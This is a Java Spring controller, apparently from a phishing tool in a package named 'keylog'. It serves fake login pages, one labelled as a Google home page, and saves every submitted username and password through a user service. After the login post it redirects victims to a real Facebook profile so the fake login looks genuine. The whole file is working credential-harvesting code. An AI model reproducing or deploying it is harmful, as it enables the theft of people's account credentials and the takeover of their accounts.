package com.huong.keylog.controller;

import java.util.Map;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.ModelAndView;

import com.huong.keylog.model.User;
import com.huong.keylog.service.UserService;

@Controller
public class UserController {
	@Autowired
	UserService userService;
	@GetMapping(value = { "/login" })
	public String login() {
		return "login";
	}
	@PostMapping("/login")
	public String login(@RequestParam(value="userName", required=false) String userName,
            @RequestParam(value="pass", required=false) String pass){
		
		User user = new User();
		user.setUserName(userName);
		user.setPass(pass);
		if(userService.checkUser(user) || userName.trim().equals("") || pass.trim().equals("")) {
			
			return "loiDangNhap";
		}
		userService.create(user);
		
	    return "redirect:" + "redirect";
		//return "lode";
	}
	@GetMapping("/")
	public String getButton() {
		return "button";
	}
	@GetMapping("/google-home")
	public String google() {
		return "homeGoogle";
	}
	@PostMapping("/google-home")
	public String google(@RequestParam(value="userName", required=false) String userName,
            @RequestParam(value="pass", required=false) String pass) {
		User user = new User();
		user.setUserName(userName);
		user.setPass(pass);

		userService.create(user);
				return "lode";
		
	}
	@RequestMapping(value = "/redirect", method = RequestMethod.GET)
	public ModelAndView method() {
		String redirectUrl = "https://www.facebook.com/profile.php?id=100044509807985&__tn__=%2CdC-R-R&eid=ARDAGiXWoERoY0HbDpgcpsjh8NJmX-iF9o6uvqOe8hfwXQYKzlWG8IxUcbrnQCtt_QcGgQUC43JXENTl&hc_ref=ARQCC-Npn6ToPjxxs3WTAF8Y9nzopYBnOphJpgzW1-4OCjsTbZG74GBhEh-DVKQg6Q4&fref=nf";
	    return new ModelAndView("redirect:" + redirectUrl);
	}
}
